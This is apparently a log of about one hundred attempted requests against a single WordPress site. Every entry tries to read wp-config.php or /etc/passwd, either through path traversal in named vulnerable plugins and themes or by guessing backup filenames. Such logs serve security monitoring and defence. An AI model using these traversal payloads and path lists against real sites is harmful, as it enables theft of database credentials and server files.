Attempts: 1 - Request URL: imagostructures.com/%23wp-config.php%23
Attempts: 2 - Request URL: imagostructures.com/blog/secondaryphase/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
Attempts: 3 - Request URL: imagostructures.com/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
Attempts: 4 - Request URL: imagostructures.com/general.php?file=wp-config.php
Attempts: 5 - Request URL: imagostructures.com/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
Attempts: 6 - Request URL: imagostructures.com/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
Attempts: 7 - Request URL: imagostructures.com/photocrati_ajax?action=upload_image&gallery_id=0&gallery_name=../../../../wp-config.php
Attempts: 8 - Request URL: imagostructures.com/wordpress/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php
Attempts: 9 - Request URL: imagostructures.com/wordpress/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes
Attempts: 10 - Request URL: imagostructures.com/wordpress/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php
Attempts: 11 - Request URL: imagostructures.com/wp-admin/blog/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
Attempts: 12 - Request URL: imagostructures.com/wp-config.bak
Attempts: 13 - Request URL: imagostructures.com/wp-config.old
Attempts: 14 - Request URL: imagostructures.com/wp-config.orig
Attempts: 15 - Request URL: imagostructures.com/wp-config.original
Attempts: 16 - Request URL: imagostructures.com/wp-config.php~
Attempts: 17 - Request URL: imagostructures.com/wp-config.php~~
Attempts: 18 - Request URL: imagostructures.com/wp-config.php_
Attempts: 19 - Request URL: imagostructures.com/wp-config.php-
Attempts: 20 - Request URL: imagostructures.com/wp-config.php--
Attempts: 21 - Request URL: imagostructures.com/wp-config.php1
Attempts: 22 - Request URL: imagostructures.com/wp-config.php.backup
Attempts: 23 - Request URL: imagostructures.com/wp-config.phpbak
Attempts: 24 - Request URL: imagostructures.com/wp-config.php_bak
Attempts: 25 - Request URL: imagostructures.com/wp-config.php-bak
Attempts: 26 - Request URL: imagostructures.com/wp-config.php.bak
Attempts: 27 - Request URL: imagostructures.com/wp-config.phpBAK
Attempts: 28 - Request URL: imagostructures.com/wp-config.php.dist
Attempts: 29 - Request URL: imagostructures.com/wp-config.phpold
Attempts: 30 - Request URL: imagostructures.com/wp-config.php_old
Attempts: 31 - Request URL: imagostructures.com/wp-config.php-old
Attempts: 32 - Request URL: imagostructures.com/wp-config.php.old
Attempts: 33 - Request URL: imagostructures.com/wp-config.php.orig
Attempts: 34 - Request URL: imagostructures.com/wp-config.php.original
Attempts: 35 - Request URL: imagostructures.com/wp-config.php.save
Attempts: 36 - Request URL: imagostructures.com/wp-config.php.swo
Attempts: 37 - Request URL: imagostructures.com/.wp-config.php.swp
Attempts: 38 - Request URL: imagostructures.com/wp-config.php.swp
Attempts: 39 - Request URL: imagostructures.com/wp-config.php.txt
Attempts: 40 - Request URL: imagostructures.com/wp-config.save
Attempts: 41 - Request URL: imagostructures.com/wp-config.txt
Attempts: 42 - Request URL: imagostructures.com/wp-content/force-download.php?file=..%2Fwp-config.php
Attempts: 43 - Request URL: imagostructures.com/wp-content/force-download.php?file=../wp-config.php
Attempts: 44 - Request URL: imagostructures.com/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../../../../../../../wp-config.php%00
Attempts: 45 - Request URL: imagostructures.com/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php
Attempts: 46 - Request URL: imagostructures.com/wp-content/plugins/ajax-store-locator-wordpress_/sl_file_download.php?download_file=../../wp-config.php
Attempts: 47 - Request URL: imagostructures.com/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php
Attempts: 48 - Request URL: imagostructures.com/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php
Attempts: 49 - Request URL: imagostructures.com/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php
Attempts: 50 - Request URL: imagostructures.com/wp-content/plugins/codecanyon-5293356-ajax-store-locator-wordpress/sl_file_download.php?download_file=../../../wp-config.php
Attempts: 51 - Request URL: imagostructures.com/wp-content/plugins/contus-video-gallery/hdflvplayer/download.php?f=../../../../wp-config.php
Attempts: 52 - Request URL: imagostructures.com/wp-content/plugins/db-backup/download.php?file=..%2F..%2F..%2Fwp-config.php
Attempts: 53 - Request URL: imagostructures.com/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php
Attempts: 54 - Request URL: imagostructures.com/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php
Attempts: 55 - Request URL: imagostructures.com/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php
Attempts: 56 - Request URL: imagostructures.com/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=..%2F..%2F..%2Fwp-config.php
Attempts: 57 - Request URL: imagostructures.com/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php
Attempts: 58 - Request URL: imagostructures.com/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php
Attempts: 59 - Request URL: imagostructures.com/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php
Attempts: 60 - Request URL: imagostructures.com/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php
Attempts: 61 - Request URL: imagostructures.com/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php
Attempts: 62 - Request URL: imagostructures.com/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php
Attempts: 63 - Request URL: imagostructures.com/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd
Attempts: 64 - Request URL: imagostructures.com/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=..%2F..%2F..%2Fwp-config.php
Attempts: 65 - Request URL: imagostructures.com/wp-content/plugins/plugin-newsletter/preview.php?data=..%2F..%2F..%2F..%2Fwp-config.php
Attempts: 66 - Request URL: imagostructures.com/wp-content/plugins/plugin-newsletter/preview.php?data=../../../../wp-config.php
Attempts: 67 - Request URL: imagostructures.com/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=..%2F..%2F..%2F..%2Fwp-config.php
Attempts: 68 - Request URL: imagostructures.com/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../../wp-config.php
Attempts: 69 - Request URL: imagostructures.com/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../../../../../wp-config.php%00
Attempts: 70 - Request URL: imagostructures.com/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=..%2F..%2F..%2F..%2Fwp-config.php
Attempts: 71 - Request URL: imagostructures.com/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
Attempts: 72 - Request URL: imagostructures.com/wp-content/plugins/wp-custom-pages/wp-download.php?download=../../../wp-config.php
Attempts: 73 - Request URL: imagostructures.com/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php
Attempts: 74 - Request URL: imagostructures.com/wp-content/plugins/wp-filemanager/incl/libfile.php?path=..%2F..%2F&filename=wp-config.php&action=download
Attempts: 75 - Request URL: imagostructures.com/wp-content/plugins/wp-filemanager/incl/libfile.php?path=../../&filename=wp-config.php&action=download
Attempts: 76 - Request URL: imagostructures.com/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=../../../../&name=wp-config.php
Attempts: 77 - Request URL: imagostructures.com/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php
Attempts: 78 - Request URL: imagostructures.com/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/../../wp-config.php
Attempts: 79 - Request URL: imagostructures.com/wp-content/themes/acento/includes/view-pdf.php?download=1&file=../../../../wp-config.php
Attempts: 80 - Request URL: imagostructures.com/wp-content/themes/antioch/lib/scripts/download.php?file=..%2F..%2F..%2F..%2F..%2Fwp-config.php
Attempts: 81 - Request URL: imagostructures.com/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php
Attempts: 82 - Request URL: imagostructures.com/wp-content/themes/authentic/includes/download.php?file=..%2F..%2F..%2F..%2Fwp-config.php
Attempts: 83 - Request URL: imagostructures.com/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php
Attempts: 84 - Request URL: imagostructures.com/wp-content/themes/churchope/lib/downloadlink.php?file=..%2F..%2F..%2F..%2Fwp-config.php
Attempts: 85 - Request URL: imagostructures.com/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php
Attempts: 86 - Request URL: imagostructures.com/wp-content/themes/corporate_works/downloader.php?file_download=../../../wp-config.php
Attempts: 87 - Request URL: imagostructures.com/wp-content/themes/epic/includes/download.php?file=..%2F..%2F..%2F..%2Fwp-config.php
Attempts: 88 - Request URL: imagostructures.com/wp-content/themes/epic/includes/download.php?file=../../../../wp-config.php
Attempts: 89 - Request URL: imagostructures.com/wp-content/themes/epic/includes/download.php?file=wp-config.php
Attempts: 90 - Request URL: imagostructures.com/wp-content/themes/estrutura-basica/scripts/download.php?arquivo=../../wp-config.php
Attempts: 91 - Request URL: imagostructures.com/wp-content/themes/felis/download.php?file=../../../wp-config.php
Attempts: 92 - Request URL: imagostructures.com/wp-content/themes/felis/download.php?file=../wp-config.php
Attempts: 93 - Request URL: imagostructures.com/wp-content/themes/FR0_theme/down.php?path=../../../wp-config.php
Attempts: 94 - Request URL: imagostructures.com/wp-content/themes/jarida/download.php?uri=../../../wp-config.php
Attempts: 95 - Request URL: imagostructures.com/wp-content/themes/linenity/functions/download.php?imgurl=..%2F..%2F..%2F..%2Fwp-config.php
Attempts: 96 - Request URL: imagostructures.com/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php
Attempts: 97 - Request URL: imagostructures.com/wp-content/themes/lote27/download.php?download=..%2F..%2F..%2Fwp-config.php
Attempts: 98 - Request URL: imagostructures.com/wp-content/themes/lote27/download.php?download=../../../wp-config.php
Attempts: 99 - Request URL: imagostructures.com/wp-content/themes/markant/download.php?file=../../../wp-config.php
Attempts: more than 99 - Request URL: imagostructures.com/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php
